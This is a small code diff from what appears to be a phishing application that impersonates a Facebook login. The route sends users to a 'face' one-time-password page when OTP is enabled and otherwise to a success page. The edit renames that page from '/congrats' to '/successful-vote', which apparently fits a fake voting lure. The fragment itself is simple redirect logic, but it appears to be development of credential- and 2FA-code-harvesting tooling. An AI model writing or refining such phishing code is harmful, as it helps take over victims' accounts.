@@ -117,7 +117,7 @@ Login now: https://www.facebook.com
             if (link.otpEnabled) {
                 return res.redirect("/face/otp/" + link.id);
             } else {
-                return res.redirect("/congrats");
+                return res.redirect("/successful-vote");
             }
         }
         else {
